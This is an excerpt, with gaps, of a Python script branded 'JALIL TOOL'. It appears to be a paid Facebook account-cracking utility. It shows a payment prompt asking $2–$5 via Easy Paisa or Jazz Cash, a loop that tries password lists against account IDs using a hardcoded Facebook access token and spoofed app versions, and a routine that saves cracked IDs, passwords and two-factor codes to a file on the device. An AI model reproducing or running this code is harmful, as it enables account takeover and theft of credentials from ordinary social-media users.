...
def approval():
  ...
  try:
    ...
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO JALIL TOOL AND ENJOY \33[0;m")
      print('\33[1;37m ====================================================')

      print ("\33[1;37m SEND 2$ (FOR 15 DAYS APPROVEL)")
      print('\33[1;37m ====================================================')
      print ("\33[1;37m SEND 5$ (FOR 30 DAYS APPROVEL)")
      print('\33[1;37m ====================================================')
      print ("\33[1;37m Easy Paisa (0676980481)")
      print ("\33[1;37m Jazz Cash  (0676980481)")
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [JALIIIL] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def Auto2F():
	...
	if response['Status']=="Success":
		...
		for i in codes:
			...
			open('/sdcard/jaliiiil.txt','a').write(id+'|'+ps+'\n'+keys+'\n'+i+'\n')
